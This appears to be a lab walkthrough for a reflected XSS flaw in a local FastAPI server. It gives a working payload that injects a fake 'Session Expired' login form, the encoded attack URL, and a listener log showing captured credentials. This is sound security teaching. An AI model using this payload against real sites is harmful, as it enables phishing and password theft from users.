## Prerequisites
First, ensure you have the necessary libraries installed:

```Bash
pip install fastapi "uvicorn[standard]"
```

Next, ensure the vulnerable server (vulnerable.py) is running.

```Bash
uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is to exploit a Reflected XSS flaw to steal a user's password. Since the session cookie is HttpOnly and cannot be stolen, we will instead inject a fake "Session Expired" login form to trick the user into re-entering their credentials.

1. Start the Attacker's Server
Open a new, separate terminal and run the following command. This starts a simple web server on port 8080 that will listen for and log the stolen credentials.

```Bash
python3 -m http.server 8080
```
(Use python -m http.server 8080 if you are on Windows).

2. Verify HttpOnly Cookie (Optional)
In your browser, visit the homepage http://127.0.0.1:8000/. Open the developer tools (F12) and go to the Application tab. Under Cookies, you will see session_id. Note that the HttpOnly box is checked. This confirms our cookie-stealing script won't work, forcing us to try this new attack.

3. Perform the Exploit (Victim Clicks Link)
The attacker crafts a malicious URL. The payload is a script that replaces the entire page with a fake login form. This form's "action" points to the attacker's server.

Payload: 
```bash
<script>document.body.innerHTML = '<form action="http://127.0.0.1:8080/login"><h1>Session Expired</h1>Please log in again:<br>Username: <input name="user"><br>Password: <input name="pass" type="password"><br><input type="submit"></form>'</script>
```

To send this in a URL, it must be encoded. This is the final link an attacker would send to a victim:

```bash
http://127.0.0.1:8000/search?q=%3Cscript%3Edocument.body.innerHTML%20%3D%20%27%3Cform%20action%3D%22http%3A%2F%2F127.0.0.1%3A8080%2Flogin%22%3E%3Ch1%3ESession%20Expired%3C%2Fh1%3EPlease%20log%20in%20again%3A%3Cbr%3EUsername%3A%20%3Cinput%20name%3D%22user%22%3E%3Cbr%3EPassword%3A%20%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbr%3E%3Cinput%20type%3D%22submit%22%3E%3C%2Fform%3E%27%3C%2Fscript%3E
```

Paste this full, encoded link into your browser's address bar (simulating a victim clicking it) and press Enter.

4. Analyze the Result
In your browser: The page will load, but instead of "search results," the malicious script executes and completely replaces the page with a fake "Session Expired" form. Because the URL in the address bar is still 127.0.0.1:8000, the victim trusts the form.

Type in a fake username and password (e.g., my_user / my_password123) and click "Submit."

In your attacker's terminal: You will see a new log entry. The browser has sent the victim's credentials directly to you, captured in the GET request.

Attacker's Terminal (Successful Exploit):

```Bash
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [02/Nov/2025 09:10:00] "GET /login?user=my_user&pass=my_password123 HTTP/1.1" 200 -
```

This confirms the exploit was successful. The attacker has stolen the user's password, completely bypassing the HttpOnly cookie protection.